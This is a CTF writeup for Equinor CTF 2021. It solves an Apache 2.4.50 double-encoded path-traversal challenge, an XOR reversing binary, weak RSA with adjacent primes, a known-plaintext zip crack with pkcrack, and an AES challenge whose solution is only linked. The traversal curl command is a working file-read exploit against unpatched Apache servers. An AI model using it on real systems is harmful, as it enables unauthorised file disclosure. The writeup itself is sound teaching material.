---
title: 'Equinor CTF 2021 Writeup'
date: '2021-10-31'
category: 'writeup'
description: "Heres a small writeup on the challenges I solved for Equinor CTF 2021 with team Corax :) I was quite busy the weekend of this CTF and didn't get to really enjoy the CTF throughly as much as I wanted. The challenges were pretty fun to work on together with the team nonetheless!"
tags:
  - 'equinor-ctf'
  - 'ctf'
---

Heres a small writeup on the challenges I solved for Equinor CTF 2021 with team Corax :) I was quite busy the weekend of this CTF and didn't get to really enjoy the CTF throughly as much as I wanted. The challenges were pretty fun to work on together with the team nonetheless!

## Beginner/AH-64

> Author: `LOLASL`
> 33 solves / 335 points
>
> Category: Web
>
> Super Six One, go to UHF secure. I've got some bad news. > We see vulnerabilites like it is 2001. Tango located in `/opt/flag`
>
> Site: [AH-64](http://io.ept.gg:30071/)

Since this is a web challenge, I begin by navigating to the site and sees a blank page with a text saying: "It works!"

```sh
$ curl -i http://io.ept.gg:30071
HTTP/1.1 200 OK
Date: Sun, 31 Oct 2021 19:01:49 GMT
Server: Apache/2.4.50 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: "2d-432a5e4a73a80"
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html

<html><body><h1>It works!</h1></body></html>
```

However looking at the request headers, we see that the website runs on the apache server 2.4.50, which we know is still vulnerable to a Path-Traversal attack due to an error in how URL encoded paths are normalized.(https://httpd.apache.org/security/vulnerabilities_24.html). Apache version 2.4.50 is supposed to be a fix of 2.4.49 where `%2e%2e` was encoded to `..`, but the possibility of by double encoding was missed when one is not in the root directory: `%%32%65` -> `%2e` -> `.`. Utilizing this fact, we can access arbitrary files outside the site root directory by going to the previous directories through `../`.

Knowing this, I started to fuzz for available directories and `cgi-bin` was found, letting us easiliy curl for the flag at `/opt/flag`:

```sh
$ curl --path-as-is -g 'http://io.ept.gg:30071/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/opt/flag'
EPT{we've_got_a_blackhawk_down_we've_got_a_blackhawk_down_i_mean_apache}
```

The flag is `EPT{we've_got_a_blackhawk_down_we've_got_a_blackhawk_down_i_mean_apache}`

## Beginner/baby2

> Author: nordbo
> 25 solves / 384 points
>
> Category: Reversing
>
> Can you figure it out?
>
> Downloads
> [baby2](https://ctf.equinor.com/uploads?key=a18b515b8e3e405195ec99d8478f7dbfd137e06fdd0e8de64fe2e4eca7df0280%2Fbaby2)

Downloading the binary file `baby2` we see that it is an ELF binary file.

```shell
$ file baby2
baby2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b9f51ccb036ad488285d75900e8dbba1e69e09f2, for GNU/Linux 3.2.0, not stripped
```

Running the program, we can see that it is taking in a user input and checking if the input given is correct, returning either correct or incorrect.

```shell
$ chmod +x baby2
$ ./baby2
Enter the flag: EPT{flag_pl0x}
Sorry, flag is not correct :/
```

After testing the program out, as any reversing challenges, I quickly boot up ghidra in hopes of disassembling the binary, making it easier to see what is happening in the background. As this is a beginner challenge, we get to easily see the disassembled code:

```c
undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("%s","Enter the flag: ");
  fgets(local_48,0x32,stdin);
  sVar2 = strcspn(local_48,"\n");
  local_48[sVar2] = '\0';
  iVar1 = checkFlag(local_48);
  if (iVar1 == 0) {
    puts("Sorry, flag is not correct :/");
  }
  else {
    puts("Well done, that is correct!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Checking out the main function we see that the main logic is handled in line 15, seeing if the function checkFlag is returning true or false:

```c
undefined8 checkFlag(long param_1)

{
  size_t sVar1;
  uint local_10;

  sVar1 = strlen(flag);
  local_10 = 0;
  while( true ) {
    if ((int)sVar1 <= (int)local_10) {
      return 1;
    }
    if (((local_10 - ((int)local_10 >> 0x1f) & 1) + ((int)local_10 >> 0x1f) == 1) &&
       ((*(byte *)(param_1 + (int)local_10) ^ 0x37) != flag[(int)local_10])) break;
    if (((local_10 & 1) == 0) &&
       ((*(byte *)(param_1 + (int)local_10) ^ 0x13) != flag[(int)local_10])) {
      return 0;
    }
    local_10 = local_10 + 1;
  }
  return 0;
}
```

Upon further inspection, we see that the user input is being XOR'ed with a hardcoded value (either `0x37` or `0x13`) depending on the index of the input, and checks if it is equals to the variable `flag`:
![ghidra flag variable](https://i.imgur.com/rVwbbLO.png)

Since the inverse of XOR is XOR itself, we can extract the `flag` value and write a script to XOR it with the same values as above in reverse:

```python
c = "5667474c6b07616867584c43765f4c5a23072307230723077d166e"
c = bytes.fromhex(c)
flag = ""
for i in range(len(c)):
    char = c[i]
    if i % 2 == 1:
        flag += chr(char^0x37)
    else:
        flag += chr(char^0x13)
print(flag) # EPT{x0r_to_teh_m00000000n!}
```

Running the python script above gives us the flag: `EPT{x0r_to_teh_m00000000n!}`

## Crypto/Really Solid Algebra

> Author: null
> 24 solves / 390 points
>
> Using all the latest math and crypto libraries, this new Really Solid Algebra system should be practically uncrackable!
>
> Downloads
> [rsa.py](https://ctf.equinor.com/uploads?key=d3f47162a9d3619ec8a0f08c44dc72b0758a312b92e26159430d287e406c409a%2Frsa.py) > [output.log](https://ctf.equinor.com/uploads?key=55221d9f16557f33fa3699169f3b8a1ea78211f4d398ffea5098108f1088a357%2Foutput.log)

Opening `rsa.py` we are given the encryption code, and the `output.log` contains the modulus `n` and the ciphertext:

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from sympy import randprime, nextprime, invert

p = randprime(2**1023, 2**1024)
q = nextprime(p)
n = p * q
e = 65537
phi = (p-1)*(q-1)
d = int(invert(e, phi))
key = RSA.construct((n, e, d, p, q))
rsa = PKCS1_OAEP.new(key)
print(n)
print(rsa.encrypt(open('./flag.txt', 'rb').read()))
```

```
13170168669036673658789415835821860466913191064101534501779274940690742604281448647173671946400157617199838272310601920602142822774113607705996734952326957290215951537099625639427739047605224303952391610020730760816940205220160216771511419133822833718461981026872830323755731912443015969055035169814519489784526129811052288823469079931979611710076056973923037676007513769049838507897490490814829478688852449121000733730837518239278607078752774705826529888903312298568894804438251828413144707077871047124974876546688478973141243880671642440976847597210524941636796956020071417167383875898209056473829391281999028768027
b'$\x1f\xcd\x00=\xd8\xe7"w\x92\xf4\xd4_D\xe4\xba\x0be\xc3\x07\xd9/;\xcf\x0eD\xe4UE\xcb\x81\xfb\xd8\xe7\x98\x02\xa1w\xc9#\x84\xcf\x10V\xf6\x8aZ\xad\xee\x1a+Z\xb3Kp\xd3]1\x0f\xb9\x16l\xa6R\xa0uK\x13\xbebtY\xe3Y\xdan\x99\x8d5}\xbai\xd2ss&\xb4h:U\xe4\xf8\x08\xfc)\xfeP\x0c\xa8tq\xd0Y\xd1\x81\xd5\xa2P\xcf\xcd\xee\xb9X<1\xaa\x0f\xcb\x89\x88\x15\xabj\xfc\xec\x05:\xc11\xf3\xc5\xb4"\xa5\x03jy\x9f\x8c\xa0r\xb8\xbcu\x07\xda\xa3\xebt\\w\xa7\xc4x\xe6G\xf3\xc3\x84\xc0U22\xa3a\x80S\x7f\x18>\x04}\xe9\xcd\x97\xe6\x8e\xf8\xf5\x03\x88\x97\xab\x1b\x1b\x1f\xbe7\'\x90P\xbc\'\x02 \xf2.\x18\xce\x89ua\xf6#3PU\xb3\xe5x\xfd\xbd\xf0\x86\xd8\x17U\xd2m\xf8!\xc7\x99e\x12\xdb\xeb\x86\xf4\x14\x833>\xc0\xa2\xdck\x94\xd3\xbc\x05-\xcc\xb6 \x96\xc4C\x1a&\xaf\xcb\xb8.\xcep'
```

Observing the code, we can first see that there’s something strange with the prime generation. The problem is that it doesn't generate two independent random primes as an RSA prime generation should. Instead it generates an independent random prime number `p` (from `2^1023` to `2^1024` bits), then a the next prime q which is very close to p: `q = nextprime(p)` (meaning that q is generated dependent on p).

Looking at how `p` and `q` is close to each other we can approximate a prime by taking the sqrt of `n`. Knowing the approximate p, and that it is not too far off the exact value of p, we can do a linear search for p by checking when the approximate p divides N (getting the exact prime factor of N), thus we can find both primes `p` and `q`.

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from sympy import randprime, nextprime, invert
import gmpy2
from gmpy2 import mpz

e = 65537
n = mpz(13170168669036673658789415835821860466913191064101534501779274940690742604281448647173671946400157617199838272310601920602142822774113607705996734952326957290215951537099625639427739047605224303952391610020730760816940205220160216771511419133822833718461981026872830323755731912443015969055035169814519489784526129811052288823469079931979611710076056973923037676007513769049838507897490490814829478688852449121000733730837518239278607078752774705826529888903312298568894804438251828413144707077871047124974876546688478973141243880671642440976847597210524941636796956020071417167383875898209056473829391281999028768027)
flag = b'$\x1f\xcd\x00=\xd8\xe7"w\x92\xf4\xd4_D\xe4\xba\x0be\xc3\x07\xd9/;\xcf\x0eD\xe4UE\xcb\x81\xfb\xd8\xe7\x98\x02\xa1w\xc9#\x84\xcf\x10V\xf6\x8aZ\xad\xee\x1a+Z\xb3Kp\xd3]1\x0f\xb9\x16l\xa6R\xa0uK\x13\xbebtY\xe3Y\xdan\x99\x8d5}\xbai\xd2ss&\xb4h:U\xe4\xf8\x08\xfc)\xfeP\x0c\xa8tq\xd0Y\xd1\x81\xd5\xa2P\xcf\xcd\xee\xb9X<1\xaa\x0f\xcb\x89\x88\x15\xabj\xfc\xec\x05:\xc11\xf3\xc5\xb4"\xa5\x03jy\x9f\x8c\xa0r\xb8\xbcu\x07\xda\xa3\xebt\\w\xa7\xc4x\xe6G\xf3\xc3\x84\xc0U22\xa3a\x80S\x7f\x18>\x04}\xe9\xcd\x97\xe6\x8e\xf8\xf5\x03\x88\x97\xab\x1b\x1b\x1f\xbe7\'\x90P\xbc\'\x02 \xf2.\x18\xce\x89ua\xf6#3PU\xb3\xe5x\xfd\xbd\xf0\x86\xd8\x17U\xd2m\xf8!\xc7\x99e\x12\xdb\xeb\x86\xf4\x14\x833>\xc0\xa2\xdck\x94\xd3\xbc\x05-\xcc\xb6 \x96\xc4C\x1a&\xaf\xcb\xb8.\xcep'
print(n)
print()

estimate = mpz(gmpy2.iroot(n, 2)[0])
prime = estimate
print(estimate)
for _ in range(10000):
    prime += 1
    if n%prime == 0:
        break
p = mpz(prime)
q = mpz(n // p)
assert(p*q == n)
print("p: ", p)
print("q: ", q)
phi = (p-1)*(q-1)
d = int(invert(e, phi))
key = RSA.construct((int(n), int(e), int(d), int(p), int(q)))
rsa = PKCS1_OAEP.new(key)
print(rsa.decrypt(flag)) # EPT{5qrt_b3_sc4ry_owo}
```

Running the script above gives us the flag: `EPT{5qrt_b3_sc4ry_owo}`

## Misc/Uncrackable zip

> Author: vcpo
> 15 solves / 439 points
>
> Take a zip of my uncrackable drink.
>
> Description
> ![uncrackable zip challenge description](https://i.imgur.com/fyP4l3W.png)
>
> Downloads
> [challenge.zip](https://ctf.equinor.com/uploads?key=9a0d3c9318f8e34e36ec516c7a34d92efd86ae56d14d713382444de6d753a18d%2Fchallenge.zip)

Looking at the given image above, we can see that the zip file `challenge.zip` contains 2 files: `flag.txt` and `hint.txt` (which we know the content of):

```
This is a zip file that you will never be able to crack, the password has 39 characters. Go ahead and use johns/hashcats etc., if you have 1000 years to spare :)
```

Downloading the zip file `challenge.zip` and trying to unzip it prompts us for a password, which we know isn't bruteforce able as it will take to long.

After a quick google search we see that there's something called a `known plaintext attack`, which means that one can break the cipher if one knows a part of the encrypted data. (which in this case, we do with `hint.txt`)

Luckily someone has already implemented the algorithm that was developed by Eli Biham and Paul Kocher on a `known plaintext attack` on zip files described in [this paper (Postscript, 80k)](ftp://utopia.hacktic.nl/pub/crypto/cracking/pkzip.ps.gz) (I didn't read this however).
The program can be found here: https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html

With the implementation in box, solving this challenge has become just as easy as running the program:

```shell
$ ls
hint.txt
$ cat hint.txt
This is a zip file that you will never be able to crack, the password has 39 characters. Go ahead and use johns/hashcats etc., if you have 1000 years to spare :)
$ 7z a new.zip *
```

and

```shell
$ ls
pkcrack challenge.zip new.zip
$ ./pkcrack -C challenge.zip -c "hint.txt" -P new.zip -p "hint.txt" -d decrypted.zip -a
```

Opening the decrypted zip file `decrypted.zip` and we get the flag: `EPT{d1d_y0u_gu3$$_th3_p4$$w0rd_0r_pl41nt3xt_cr4ck_1t?}`

## Crypto/Arbitrary Encoding System

> Author: null
> 20 solves / 413 points
>
> I heard that all the cool kids down the street had switched to this new cipher. Think it was called Arbitrary Encoding System or something...
>
> Downloads
> [aes.py](https://ctf.equinor.com/uploads?key=4012c19f43295280bc5eb2a324b824d16910a9d4c6d554a6c64fc08b565a25a3%2Faes.py) > [flag.png.enc](https://ctf.equinor.com/uploads?key=23c3bb3c9044a6d201c6d5347471ab131bcb4f4f5f823d011a1eb0b81bd333f7%2Fflag.png.enc)

Read this writeup for some good shit explanations: https://github.com/williamsolem/writeups/tree/main/EquinorCTF#arbitrary-encoding-system. Thank you!

The flag is: `EPT{mode_of_operation_is_important}`
